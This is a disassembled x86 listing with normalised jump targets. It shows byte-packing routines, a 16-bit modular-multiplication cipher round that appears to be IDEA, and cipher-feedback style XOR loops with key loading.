mov [ edi ] dl
mov eax ecx
inc edi
shr eax 0x8
mov [ edi ] al
mov eax [ esp + 0x14 ]
inc edi
mov [ edi ] cl
inc edi
dec eax
mov [ esp + 0x14 ] eax
jne r-xdata
mov ebp [ esp + 0x34 ]
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x2c ]
mov ecx ebx
cmp ebx 0xfffffff8
je r-xdata
xor eax eax
xor ecx ecx
mov al [ edi ]
mov cl [ edi + 0x1 ]
shl eax 0x18
inc edi
xor ebx ebx
shl ecx 0x10
or eax ecx
inc edi
xor ecx ecx
mov ch [ edi ]
or eax ecx
inc edi
xor ecx ecx
mov cl [ edi ]
or eax ecx
inc edi
xor ecx ecx
xor eax edx
mov cl [ edi ]
mov bl [ edi + 0x1 ]
shl ecx 0x18
inc edi
mov edx [ esp + 0x30 ]
shl ebx 0x10
or ecx ebx
inc edi
xor ebx ebx
mov [ esp + 0x18 ] eax
mov bh [ edi ]
mov eax [ esp + 0x34 ]
or ecx ebx
inc edi
xor ebx ebx
push edx
mov bl [ edi ]
or ecx ebx
inc edi
xor ecx eax
lea eax [ esp + 0x1c ]
push eax
mov [ esp + 0x24 ] ecx
call sub_100445f0
mov edx [ esp + 0x20 ]
add esp 0x8
mov ecx edx
mov eax edx
shr ecx 0x18
mov [ esi ] cl
inc esi
shr eax 0x10
mov [ esi ] al
mov eax [ esp + 0x1c ]
mov ecx edx
inc esi
shr ecx 0x8
mov [ esi ] cl
inc esi
mov ecx eax
mov [ esp + 0x34 ] eax
mov [ esi ] dl
inc esi
shr ecx 0x18
mov [ esi ] cl
mov ecx eax
inc esi
shr ecx 0x10
mov [ esi ] cl
mov ecx eax
inc esi
shr ecx 0x8
mov [ esi ] cl
mov ecx [ esp + 0x38 ]
inc esi
mov [ esi ] al
inc esi
dec ecx
mov [ esp + 0x38 ] ecx
jne r-xdata
mov ebx [ esp + 0x2c ]
mov edx eax
pop edi
shr edx 0x18
mov [ ebp ] dl
mov edx eax
inc ebp
pop esi
shr edx 0x10
mov [ ebp ] dl
mov edx eax
inc ebp
shr edx 0x8
mov [ ebp ] dl
inc ebp
mov edx ecx
mov [ ebp ] al
mov eax ecx
inc ebp
shr eax 0x18
mov [ ebp ] al
inc ebp
shr edx 0x10
mov [ ebp ] dl
mov eax ecx
inc ebp
shr eax 0x8
mov [ ebp ] al
mov [ ebp + 0x1 ] cl
pop ebp
pop ebx
add esp 0x10
retn
xor ebx ebx
xor ecx ecx
mov bl [ esi ]
mov cl [ esi + 0x1 ]
shl ebx 0x18
inc esi
xor edx edx
shl ecx 0x10
mov dh [ esi + 0x1 ]
or ebx ecx
inc esi
or ebx edx
inc esi
xor eax eax
xor ecx ecx
xor edx edx
mov al [ esi ]
or ebx eax
inc esi
xor eax eax
mov [ esp + 0x18 ] ebx
mov al [ esi ]
mov cl [ esi + 0x1 ]
shl eax 0x18
inc esi
shl ecx 0x10
mov dh [ esi + 0x1 ]
or eax ecx
mov dl [ esi + 0x2 ]
inc esi
or eax edx
lea ecx [ esp + 0x18 ]
mov [ esp + 0x28 ] eax
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x30 ]
push eax
push ecx
call sub_100445f0
mov ecx [ esp + 0x40 ]
mov edx [ esp + 0x24 ]
mov eax [ esp + 0x18 ]
mov esi [ esp + 0x20 ]
xor ecx edx
mov edx [ esp + 0x34 ]
add esp 0x8
xor eax esi
lea edi [ edi + edx + 0x8 ]
add edx 0x7
cmp edx 0x7
ja r-xdata
mov ecx edx
pop edi
shr ecx 0x18
mov [ ebp ] cl
mov ecx edx
inc ebp
pop esi
shr ecx 0x10
mov [ ebp ] cl
mov ecx edx
inc ebp
shr ecx 0x8
mov [ ebp ] cl
inc ebp
mov ecx eax
mov [ ebp ] dl
mov edx eax
inc ebp
shr edx 0x18
mov [ ebp ] dl
inc ebp
shr ecx 0x10
mov [ ebp ] cl
mov edx eax
inc ebp
shr edx 0x8
mov [ ebp ] dl
mov [ ebp + 0x1 ] al
pop ebp
pop ebx
add esp 0x10
retn
lea ecx [ edi + ebx + 0x8 ]
add ebx 0x7
xor edi edi
cmp ebx 0x7
mov [ esp + 0x28 ] 0x0
ja r-xdata
mov eax [ esp + 0x28 ]
mov [ esp + 0x10 ] ebx
mov [ esp + 0x38 ] eax
mov ecx eax
mov eax ebx
jmp [ edx * 4 + jump_table_100445d0 ]
mov ecx [ esp + 0x28 ]
xor edi edx
mov edx [ esp + 0x30 ]
xor ecx eax
lea eax [ esp + 0x18 ]
push edx
push eax
mov [ esp + 0x20 ] edi
mov [ esp + 0x24 ] ecx
call sub_100445f0
mov edx [ esp + 0x20 ]
add esp 0x8
mov ecx edx
mov eax edx
shr ecx 0x18
mov [ esi ] cl
inc esi
shr eax 0x10
mov [ esi ] al
mov eax [ esp + 0x1c ]
mov ecx edx
inc esi
shr ecx 0x8
mov [ esi ] cl
inc esi
mov ecx eax
mov [ esi ] dl
inc esi
shr ecx 0x18
mov [ esi ] cl
mov ecx eax
inc esi
shr ecx 0x10
mov [ esi ] cl
mov ecx eax
inc esi
shr ecx 0x8
mov [ esi ] cl
mov [ esi + 0x1 ] al
jmp [ ebx * 4 + jump_table_100445b0 ]
dec edi
mov [ edi ] cl
mov edx ecx
dec edi
shr edx 0x8
mov [ edi ] dl
mov edx ecx
dec edi
shr edx 0x10
mov [ edi ] dl
dec edi
shr ecx 0x18
mov [ edi ] cl
dec edi
mov [ edi ] al
mov ecx eax
dec edi
shr ecx 0x8
mov [ edi ] cl
mov edx eax
dec edi
shr edx 0x10
mov [ edi ] dl
shr eax 0x18
mov [ edi - 0x1 ] al
dec ecx
xor ebx ebx
mov bl [ ecx ]
mov [ esp + 0x28 ] ebx
mov edi [ esp + 0x28 ]
dec ecx
xor ebx ebx
mov bh [ ecx ]
or edi ebx
mov [ esp + 0x28 ] edi
mov edi [ esp + 0x28 ]
dec ecx
xor ebx ebx
mov bl [ ecx ]
shl ebx 0x10
or edi ebx
mov [ esp + 0x28 ] edi
mov edi [ esp + 0x28 ]
dec ecx
xor ebx ebx
mov bl [ ecx ]
shl ebx 0x18
or edi ebx
mov [ esp + 0x28 ] edi
dec ecx
xor ebx ebx
mov bl [ ecx ]
mov edi ebx
dec ecx
xor ebx ebx
mov bh [ ecx ]
or edi ebx
dec ecx
xor ebx ebx
mov bl [ ecx ]
shl ebx 0x10
or edi ebx
xor ebx ebx
mov bl [ ecx - 0x1 ]
shl ebx 0x18
or edi ebx
sub_100445f0
mov eax 0x4
call sub_1001d0d0
mov eax [ esp + 0x8 ]
push ebx
push ebp
push esi
mov ebx [ eax ]
mov esi [ eax + 0x4 ]
mov eax [ esp + 0x18 ]
mov edx ebx
shr edx 0x10
mov ebp [ eax ]
push edi
mov ecx ebp
mov edi esi
imul ecx edx
shr edi 0x10
test ecx ecx
je r-xdata
mov ecx 0x1
sub ecx ebp
mov edx ecx
and ecx 0xffff
shr edx 0x10
sub ecx edx
mov edx ecx
shr edx 0x10
jmp r-xdata
mov ebp 0x1
sub ebp edx
sub ebp esi
mov edx ebp
and ebp 0xffff
shr edx 0x10
sub ebp edx
mov edx ebp
shr edx 0x10
sub ebp edx
jmp r-xdata
add eax 0x4
sub ecx edx
and esi 0xffff
mov [ esp + 0x1c ] ecx
mov edx [ eax ]
add eax 0x4
add ebx edx
mov edx [ eax ]
add eax 0x4
add edi edx
mov [ esp + 0x10 ] ebx
mov edx [ eax ]
mov ebp edx
imul ebp esi
test ebp ebp
je r-xdata
mov edx 0x1
sub edx ecx
sub edx esi
mov ecx edx
and edx 0xffff
shr ecx 0x10
sub edx ecx
mov ecx edx
shr ecx 0x10
sub edx ecx
jmp r-xdata
add eax 0x4
mov esi edi
xor esi ecx
mov ecx [ eax ]
and esi 0xffff
mov edx ecx
imul edx esi
test edx edx
je r-xdata
mov ebx [ eax ]
mov ecx 0x1
sub ecx ebx
mov ebx [ esp + 0x10 ]
sub ecx esi
mov esi ecx
and ecx 0xffff
shr esi 0x10
sub ecx esi
mov esi ecx
shr esi 0x10
sub ecx esi
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov esi ebp
xor esi ebx
add eax 0x4
add esi edx
and esi 0xffff
imul ecx esi
test ecx ecx
je r-xdata
mov edx 0x1
sub edx edi
mov ecx edx
and edx 0xffff
shr ecx 0x10
sub edx ecx
mov ecx edx
shr ecx 0x10
jmp r-xdata
mov esi ecx
add edx ecx
xor esi edi
mov edi [ esp + 0x1c ]
add eax 0x4
xor ebp edx
xor edx ebx
xor ecx edi
mov edi [ eax ]
mov ebx edx
and ecx 0xffff
mov edx edi
imul edx ecx
test edx edx
je r-xdata
mov ebx 0x1
sub ebx ecx
sub ebx ebp
mov edx ebx
and ebx 0xffff
shr edx 0x10
sub ebx edx
mov ecx ebx
shr ecx 0x10
sub ebx ecx
jmp r-xdata
mov edi [ eax + 0x4 ]
add eax 0x4
add eax 0x4
sub edx ecx
and ebp 0xffff
add esi edi
mov ecx [ eax ]
add eax 0x4
add ebx ecx
mov [ esp + 0x1c ] edx
mov ecx [ eax ]
mov [ esp + 0x10 ] ebx
mov ebx ecx
imul ebx ebp
test ebx ebx
je r-xdata
mov edx 0x1
sub edx edi
mov ecx edx
and edx 0xffff
shr ecx 0x10
sub edx ecx
mov ecx edx
shr ecx 0x10
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov edi [ esp + 0x1c ]
add eax 0x4
xor ecx edi
and ecx 0xffff
mov edi [ eax ]
mov edx edi
imul edx ecx
test edx edx
je r-xdata
mov ecx 0x1
sub ecx ebp
mov edi ecx
and ecx 0xffff
shr edi 0x10
sub ecx edi
mov edi ecx
shr edi 0x10
jmp r-xdata
mov ebp [ eax + 0x4 ]
mov edi ebx
add eax 0x4
sub edx ecx
xor edi esi
mov ecx ebp
add edi edx
and edi 0xffff
imul ecx edi
test ecx ecx
je r-xdata
mov edx 0x1
sub edx edi
mov ecx edx
and edx 0xffff
shr ecx 0x10
sub edx ecx
mov ecx edx
shr ecx 0x10
jmp r-xdata
mov ebp [ esp + 0x10 ]
sub ecx edi
mov edi [ esp + 0x1c ]
add edx ecx
xor ebx edx
add eax 0x4
xor edx esi
mov esi ecx
xor ecx edi
mov edi [ eax ]
xor esi ebp
mov ebp edx
and ecx 0xffff
mov edx edi
imul edx ecx
test edx edx
je r-xdata
mov ebp 0x1
sub ebp ecx
sub ebp ebx
mov edx ebp
and ebp 0xffff
shr edx 0x10
sub ebp edx
mov ecx ebp
shr ecx 0x10
sub ebp ecx
jmp r-xdata
mov edi [ eax + 0x4 ]
add eax 0x4
add eax 0x4
sub edx ecx
and ebx 0xffff
add esi edi
mov ecx [ eax ]
add eax 0x4
add ebp ecx
mov [ esp + 0x1c ] edx
mov ecx [ eax ]
mov [ esp + 0x10 ] ebp
mov ebp ecx
imul ebp ebx
test ebp ebp
je r-xdata
mov edx 0x1
sub edx edi
mov ecx edx
and edx 0xffff
shr ecx 0x10
sub edx ecx
mov ecx edx
shr ecx 0x10
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov edi [ esp + 0x1c ]
add eax 0x4
xor ecx edi
and ecx 0xffff
mov edi [ eax ]
mov edx edi
imul edx ecx
test edx edx
je r-xdata
mov ecx 0x1
sub ecx ebx
mov edi ecx
and ecx 0xffff
shr edi 0x10
sub ecx edi
mov edi ecx
shr edi 0x10
jmp r-xdata
mov ebx [ eax + 0x4 ]
mov edi ebp
add eax 0x4
sub edx ecx
xor edi esi
mov ecx ebx
add edi edx
and edi 0xffff
imul ecx edi
test ecx ecx
je r-xdata
mov edx 0x1
sub edx edi
mov ecx edx
and edx 0xffff
shr ecx 0x10
sub edx ecx
mov ecx edx
shr ecx 0x10
jmp r-xdata
mov ebx [ esp + 0x10 ]
sub ecx edi
mov edi [ esp + 0x1c ]
add edx ecx
xor ebp edx
add eax 0x4
xor edx esi
mov esi ecx
xor ecx edi
mov edi [ eax ]
xor esi ebx
mov ebx edx
and ecx 0xffff
mov edx edi
imul edx ecx
test edx edx
je r-xdata
mov ebx 0x1
sub ebx ecx
sub ebx ebp
mov edx ebx
and ebx 0xffff
shr edx 0x10
sub ebx edx
mov ecx ebx
shr ecx 0x10
sub ebx ecx
jmp r-xdata
mov edi [ eax + 0x4 ]
add eax 0x4
add eax 0x4
sub edx ecx
and ebp 0xffff
add esi edi
mov ecx [ eax ]
add eax 0x4
add ebx ecx
mov [ esp + 0x1c ] edx
mov ecx [ eax ]
mov [ esp + 0x10 ] ebx
mov ebx ecx
imul ebx ebp
test ebx ebx
je r-xdata
mov edx 0x1
sub edx edi
mov ecx edx
and edx 0xffff
shr ecx 0x10
sub edx ecx
mov ecx edx
shr ecx 0x10
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov edi [ esp + 0x1c ]
add eax 0x4
xor ecx edi
and ecx 0xffff
mov edi [ eax ]
mov edx edi
imul edx ecx
test edx edx
je r-xdata
mov ecx 0x1
sub ecx ebp
mov edi ecx
and ecx 0xffff
shr edi 0x10
sub ecx edi
mov edi ecx
shr edi 0x10
jmp r-xdata
mov ebp [ eax + 0x4 ]
mov edi ebx
add eax 0x4
sub edx ecx
xor edi esi
mov ecx ebp
add edi edx
and edi 0xffff
imul ecx edi
test ecx ecx
je r-xdata
mov edx 0x1
sub edx edi
mov ecx edx
and edx 0xffff
shr ecx 0x10
sub edx ecx
mov ecx edx
shr ecx 0x10
jmp r-xdata
mov ebp [ esp + 0x10 ]
sub ecx edi
mov edi [ esp + 0x1c ]
add edx ecx
xor ebx edx
add eax 0x4
xor edx esi
mov esi ecx
xor ecx edi
mov edi [ eax ]
xor esi ebp
mov ebp edx
and ecx 0xffff
mov edx edi
imul edx ecx
test edx edx
je r-xdata
mov ebp 0x1
sub ebp ecx
sub ebp ebx
mov edx ebp
and ebp 0xffff
shr edx 0x10
sub ebp edx
mov ecx ebp
shr ecx 0x10
sub ebp ecx
jmp r-xdata
mov edi [ eax + 0x4 ]
add eax 0x4
add eax 0x4
sub edx ecx
and ebx 0xffff
add esi edi
mov ecx [ eax ]
add eax 0x4
add ebp ecx
mov [ esp + 0x1c ] edx
mov ecx [ eax ]
mov [ esp + 0x10 ] ebp
mov ebp ecx
imul ebp ebx
test ebp ebp
je r-xdata
mov edx 0x1
sub edx edi
mov ecx edx
and edx 0xffff
shr ecx 0x10
sub edx ecx
mov ecx edx
shr ecx 0x10
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov edi [ esp + 0x1c ]
add eax 0x4
xor ecx edi
and ecx 0xffff
mov edi [ eax ]
mov edx edi
imul edx ecx
test edx edx
je r-xdata
mov ecx 0x1
sub ecx ebx
mov edi ecx
and ecx 0xffff
shr edi 0x10
sub ecx edi
mov edi ecx
shr edi 0x10
jmp r-xdata
mov ebx [ eax + 0x4 ]
mov edi ebp
add eax 0x4
sub edx ecx
xor edi esi
mov ecx ebx
add edi edx
and edi 0xffff
imul ecx edi
test ecx ecx
je r-xdata
mov edx 0x1
sub edx edi
mov ecx edx
and edx 0xffff
shr ecx 0x10
sub edx ecx
mov ecx edx
shr ecx 0x10
jmp r-xdata
mov ebx [ esp + 0x10 ]
sub ecx edi
mov edi [ esp + 0x1c ]
add edx ecx
xor ebp edx
add eax 0x4
xor edx esi
mov esi ecx
xor ecx edi
mov edi [ eax ]
xor esi ebx
mov ebx edx
and ecx 0xffff
mov edx edi
imul edx ecx
test edx edx
je r-xdata
mov ebx 0x1
sub ebx ecx
sub ebx ebp
mov edx ebx
and ebx 0xffff
shr edx 0x10
sub ebx edx
mov ecx ebx
shr ecx 0x10
sub ebx ecx
jmp r-xdata
mov edi [ eax + 0x4 ]
add eax 0x4
add eax 0x4
sub edx ecx
and ebp 0xffff
add esi edi
mov ecx [ eax ]
add eax 0x4
add ebx ecx
mov [ esp + 0x1c ] edx
mov ecx [ eax ]
mov [ esp + 0x10 ] ebx
mov ebx ecx
imul ebx ebp
test ebx ebx
je r-xdata
mov edx 0x1
sub edx edi
mov ecx edx
and edx 0xffff
shr ecx 0x10
sub edx ecx
mov ecx edx
shr ecx 0x10
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov edi [ esp + 0x1c ]
add eax 0x4
xor ecx edi
and ecx 0xffff
mov edi [ eax ]
mov edx edi
imul edx ecx
test edx edx
je r-xdata
mov ecx 0x1
sub ecx ebp
mov edi ecx
and ecx 0xffff
shr edi 0x10
sub ecx edi
mov edi ecx
shr edi 0x10
jmp r-xdata
mov ebp [ eax + 0x4 ]
mov edi ebx
add eax 0x4
sub edx ecx
xor edi esi
mov ecx ebp
add edi edx
and edi 0xffff
imul ecx edi
test ecx ecx
je r-xdata
mov edx 0x1
sub edx edi
mov ecx edx
and edx 0xffff
shr ecx 0x10
sub edx ecx
mov ecx edx
shr ecx 0x10
jmp r-xdata
mov ebp [ esp + 0x10 ]
sub ecx edi
mov edi [ esp + 0x1c ]
add edx ecx
xor ebx edx
add eax 0x4
xor edx esi
mov esi ecx
xor ecx edi
mov edi [ eax ]
xor esi ebp
mov ebp edx
and ecx 0xffff
mov edx edi
imul edx ecx
test edx edx
je r-xdata
mov ebp 0x1
sub ebp ecx
sub ebp ebx
mov edx ebp
and ebp 0xffff
shr edx 0x10
sub ebp edx
mov ecx ebp
shr ecx 0x10
sub ebp ecx
jmp r-xdata
mov edi [ eax + 0x4 ]
add eax 0x4
add eax 0x4
sub edx ecx
and ebx 0xffff
add esi edi
mov ecx [ eax ]
add eax 0x4
add ebp ecx
mov [ esp + 0x1c ] edx
mov ecx [ eax ]
mov [ esp + 0x10 ] ebp
mov ebp ecx
imul ebp ebx
test ebp ebp
je r-xdata
mov edx 0x1
sub edx edi
mov ecx edx
and edx 0xffff
shr ecx 0x10
sub edx ecx
mov ecx edx
shr ecx 0x10
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov edi [ esp + 0x1c ]
add eax 0x4
xor ecx edi
and ecx 0xffff
mov edi [ eax ]
mov edx edi
imul edx ecx
test edx edx
je r-xdata
mov ecx 0x1
sub ecx ebx
mov edi ecx
and ecx 0xffff
shr edi 0x10
sub ecx edi
mov edi ecx
shr edi 0x10
jmp r-xdata
mov ebx [ eax + 0x4 ]
mov edi ebp
add eax 0x4
sub edx ecx
xor edi esi
mov ecx ebx
add edi edx
and edi 0xffff
imul ecx edi
test ecx ecx
je r-xdata
mov edx 0x1
sub edx edi
mov ecx edx
and edx 0xffff
shr ecx 0x10
sub edx ecx
mov ecx edx
shr ecx 0x10
jmp r-xdata
mov ebx [ esp + 0x10 ]
sub ecx edi
mov edi [ esp + 0x1c ]
add edx ecx
xor ebp edx
add eax 0x4
xor edx esi
mov esi ecx
xor ecx edi
mov edi [ eax ]
xor esi ebx
mov ebx edx
and ecx 0xffff
mov edx edi
imul edx ecx
test edx edx
je r-xdata
mov ebx 0x1
sub ebx ecx
sub ebx ebp
mov edx ebx
and ebx 0xffff
shr edx 0x10
sub ebx edx
mov ecx ebx
shr ecx 0x10
sub ebx ecx
jmp r-xdata
mov edi [ eax + 0x4 ]
add eax 0x4
add eax 0x4
sub edx ecx
and ebp 0xffff
add esi edi
mov ecx [ eax ]
add eax 0x4
add ebx ecx
mov [ esp + 0x1c ] edx
mov ecx [ eax ]
mov [ esp + 0x10 ] ebx
mov ebx ecx
imul ebx ebp
test ebx ebx
je r-xdata
mov edx 0x1
sub edx edi
mov ecx edx
and edx 0xffff
shr ecx 0x10
sub edx ecx
mov ecx edx
shr ecx 0x10
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov edi [ esp + 0x1c ]
add eax 0x4
xor ecx edi
and ecx 0xffff
mov edi [ eax ]
mov edx edi
imul edx ecx
test edx edx
je r-xdata
mov ecx 0x1
sub ecx ebp
mov edi ecx
and ecx 0xffff
shr edi 0x10
sub ecx edi
mov edi ecx
shr edi 0x10
jmp r-xdata
mov ebp [ eax + 0x4 ]
mov edi ebx
add eax 0x4
sub edx ecx
xor edi esi
mov ecx ebp
add edi edx
and edi 0xffff
imul ecx edi
test ecx ecx
je r-xdata
mov edx 0x1
sub edx edi
mov ecx edx
and edx 0xffff
shr ecx 0x10
sub edx ecx
mov ecx edx
shr ecx 0x10
jmp r-xdata
mov ebp [ esp + 0x10 ]
sub ecx edi
mov edi [ esp + 0x1c ]
add edx ecx
xor ebx edx
add eax 0x4
xor edx esi
mov esi ecx
xor ecx edi
mov edi [ eax ]
xor esi ebp
mov ebp edx
and ecx 0xffff
mov edx edi
imul edx ecx
test edx edx
je r-xdata
mov ecx 0x1
sub ecx eax
sub ecx ebx
mov eax ecx
and ecx 0xffff
shr eax 0x10
sub ecx eax
mov eax ecx
shr eax 0x10
sub ecx eax
jmp r-xdata
mov edi [ eax + 0x4 ]
add eax 0x4
add eax 0x4
add edi ebp
sub edx ecx
and ebx 0xffff
mov ebp [ eax ]
add eax 0x4
add ebp esi
mov eax [ eax ]
mov ecx eax
imul ecx ebx
test ecx ecx
je r-xdata
mov eax [ esp + 0x18 ]
and edi 0xffff
shl edx 0x10
or edi edx
and ecx 0xffff
shl ebp 0x10
mov [ eax ] edi
or ebp ecx
pop edi
mov [ eax + 0x4 ] ebp
pop esi
pop ebp
pop ebx
pop ecx
retn
sub_10044ed0
mov eax 0x14
call sub_1001d0d0
mov eax [ esp + 0x2c ]
push ebx
push ebp
push esi
mov esi [ eax ]
push edi
mov edi [ esp + 0x38 ]
xor ecx ecx
xor edx edx
xor ebx ebx
mov cl [ edi ]
lea ebp [ edi + 0x1 ]
mov eax ebp
mov [ esp + 0x10 ] 0x0
shl ecx 0x18
mov dl [ eax ]
shl edx 0x10
or ecx edx
inc eax
xor edx edx
mov dh [ eax ]
or ecx edx
inc eax
xor edx edx
mov dl [ eax ]
or ecx edx
inc eax
xor edx edx
mov [ esp + 0x1c ] ecx
mov dl [ eax ]
mov bl [ eax + 0x1 ]
shl edx 0x18
inc eax
mov [ esp + 0x17 ] cl
shl ebx 0x10
or edx ebx
inc eax
xor ebx ebx
mov bh [ eax ]
mov bl [ eax + 0x1 ]
mov eax ecx
shr eax 0x18
mov [ esp + 0x14 ] al
mov eax ecx
shr eax 0x10
mov [ esp + 0x15 ] al
mov eax ecx
shr eax 0x8
or edx ebx
mov [ esp + 0x16 ] al
mov eax edx
mov [ esp + 0x20 ] edx
shr eax 0x18
mov [ esp + 0x18 ] al
mov eax edx
shr eax 0x10
mov [ esp + 0x19 ] al
mov eax edx
shr eax 0x8
mov [ esp + 0x1a ] al
mov eax [ esp + 0x30 ]
test eax eax
mov [ esp + 0x1b ] dl
je r-xdata
mov ecx [ esp + 0x3c ]
pop edi
mov [ ecx ] esi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
mov [ esp + 0x38 ] eax
mov eax [ esp + 0x28 ]
mov bl [ esp + esi + 0x14 ]
xor bl [ eax ]
mov eax [ esp + 0x2c ]
mov [ eax ] bl
inc eax
mov [ esp + 0x2c ] eax
mov eax [ esp + 0x28 ]
inc eax
inc esi
mov [ esp + 0x28 ] eax
mov eax [ esp + 0x38 ]
and esi 0x7
dec eax
mov [ esp + 0x38 ] eax
jne r-xdata
mov ecx [ esp + 0x34 ]
lea edx [ esp + 0x1c ]
push ecx
push edx
call sub_100445f0
mov ecx [ esp + 0x24 ]
add esp 0x8
mov eax ecx
mov edx ecx
shr eax 0x18
mov [ esp + 0x14 ] al
mov eax ecx
shr edx 0x10
mov [ esp + 0x15 ] dl
mov edx [ esp + 0x20 ]
shr eax 0x8
mov [ esp + 0x16 ] al
mov eax edx
shr eax 0x18
mov [ esp + 0x18 ] al
mov eax edx
shr eax 0x10
mov [ esp + 0x19 ] al
mov eax edx
shr eax 0x8
mov [ esp + 0x1a ] al
mov eax [ esp + 0x10 ]
inc eax
mov [ esp + 0x17 ] cl
mov [ esp + 0x1b ] dl
mov [ esp + 0x10 ] eax
test esi esi
jne r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov eax [ esp + 0x3c ]
pop edi
mov [ eax ] esi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
mov eax ecx
mov ebx ecx
shr eax 0x18
mov [ edi ] al
mov eax ebp
shr ebx 0x10
mov [ eax ] bl
mov ebx ecx
inc eax
pop edi
shr ebx 0x8
mov [ eax ] bl
inc eax
mov [ eax ] cl
mov ecx edx
inc eax
shr ecx 0x18
mov [ eax ] cl
mov ecx edx
inc eax
shr ecx 0x10
mov [ eax ] cl
mov ecx edx
inc eax
shr ecx 0x8
mov [ eax ] cl
mov [ eax + 0x1 ] dl
mov edx [ esp + 0x38 ]
mov [ edx ] esi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
sub_10045090
mov eax 0x8
call sub_1001d0d0
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x24 ]
push ebx
push ebp
push esi
mov esi [ edx ]
test eax eax
mov eax [ esp + 0x20 ]
push edi
je r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov edi [ esp + 0x2c ]
mov ebx [ esp + 0x1c ]
mov [ esp + 0x24 ] eax
mov edi [ esp + 0x2c ]
mov ebx [ esp + 0x1c ]
mov [ esp + 0x24 ] eax
mov al [ ebx ]
mov cl [ esi + edi ]
mov [ esi + edi ] al
xor al cl
mov ecx [ esp + 0x20 ]
inc ebx
mov [ ecx ] al
mov eax [ esp + 0x24 ]
inc ecx
inc esi
and esi 0x7
dec eax
mov [ esp + 0x20 ] ecx
mov [ esp + 0x24 ] eax
jne r-xdata
lea ebp [ edi + 0x1 ]
xor ecx ecx
mov cl [ edi ]
mov eax ebp
xor edx edx
mov dl [ eax ]
shl ecx 0x18
shl edx 0x10
or ecx edx
inc eax
xor edx edx
mov dh [ eax ]
or ecx edx
inc eax
xor edx edx
mov dl [ eax ]
or ecx edx
inc eax
mov [ esp + 0x10 ] ecx
xor ecx ecx
mov cl [ eax ]
xor edx edx
mov dl [ eax + 0x1 ]
shl ecx 0x18
inc eax
shl edx 0x10
or ecx edx
inc eax
xor edx edx
mov dh [ eax ]
mov dl [ eax + 0x1 ]
mov eax [ esp + 0x28 ]
or edx ecx
lea ecx [ esp + 0x10 ]
push eax
push ecx
mov [ esp + 0x1c ] edx
call sub_100445f0
mov ecx [ esp + 0x18 ]
mov eax ebp
mov edx ecx
add esp 0x8
shr edx 0x18
mov [ edi ] dl
mov edx ecx
shr edx 0x10
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x8
mov [ eax ] dl
inc eax
mov [ eax ] cl
mov ecx [ esp + 0x14 ]
mov edx ecx
inc eax
shr edx 0x18
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x10
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x8
mov [ eax ] dl
mov edx [ esp + 0x30 ]
mov [ eax + 0x1 ] cl
mov al [ ebx ]
mov cl [ esi + edi ]
xor al cl
mov ecx [ esp + 0x20 ]
inc ebx
mov [ ecx ] al
inc ecx
mov [ esi + edi ] al
mov eax [ esp + 0x24 ]
inc esi
mov [ esp + 0x20 ] ecx
and esi 0x7
dec eax
mov [ esp + 0x24 ] eax
jne r-xdata
lea ebp [ edi + 0x1 ]
xor ecx ecx
mov cl [ edi ]
mov eax ebp
xor edx edx
mov dl [ eax ]
shl ecx 0x18
shl edx 0x10
or ecx edx
inc eax
xor edx edx
mov dh [ eax ]
or ecx edx
inc eax
xor edx edx
mov dl [ eax ]
or ecx edx
inc eax
mov [ esp + 0x10 ] ecx
xor ecx ecx
mov cl [ eax ]
xor edx edx
mov dl [ eax + 0x1 ]
shl ecx 0x18
inc eax
shl edx 0x10
or ecx edx
inc eax
xor edx edx
mov dh [ eax ]
mov dl [ eax + 0x1 ]
mov eax [ esp + 0x28 ]
or edx ecx
lea ecx [ esp + 0x10 ]
push eax
push ecx
mov [ esp + 0x1c ] edx
call sub_100445f0
mov ecx [ esp + 0x18 ]
mov eax ebp
mov edx ecx
add esp 0x8
shr edx 0x18
mov [ edi ] dl
mov edx ecx
shr edx 0x10
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x8
mov [ eax ] dl
inc eax
mov [ eax ] cl
mov ecx [ esp + 0x14 ]
mov edx ecx
inc eax
shr edx 0x18
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x10
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x8
mov [ eax ] dl
mov edx [ esp + 0x30 ]
mov [ eax + 0x1 ] cl
test esi esi
jne r-xdata
test esi esi
jne r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
sub_10045290
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
xor ecx ecx
push ebx
mov ch [ eax ]
inc eax
mov [ edx ] ecx
xor ecx ecx
mov cl [ eax ]
push ebp
mov ebp [ edx ]
push esi
or ebp ecx
inc eax
xor ecx ecx
mov [ edx ] ebp
mov ch [ eax ]
inc eax
mov [ edx + 0x4 ] ecx
mov esi [ edx + 0x4 ]
xor ecx ecx
push edi
mov cl [ eax ]
or esi ecx
inc eax
xor ecx ecx
mov [ edx + 0x4 ] esi
mov ch [ eax ]
lea esi [ edx + 0x8 ]
inc eax
mov [ esi ] ecx
mov edi [ esi ]
xor ecx ecx
mov cl [ eax ]
or edi ecx
inc eax
xor ecx ecx
mov [ esi ] edi
mov ch [ eax ]
inc eax
mov [ edx + 0xc ] ecx
mov edi [ edx + 0xc ]
xor ecx ecx
mov cl [ eax ]
or edi ecx
inc eax
xor ecx ecx
mov [ edx + 0xc ] edi
mov ch [ eax ]
inc eax
mov [ edx + 0x10 ] ecx
mov edi [ edx + 0x10 ]
xor ecx ecx
mov cl [ eax ]
or edi ecx
inc eax
xor ecx ecx
mov [ edx + 0x10 ] edi
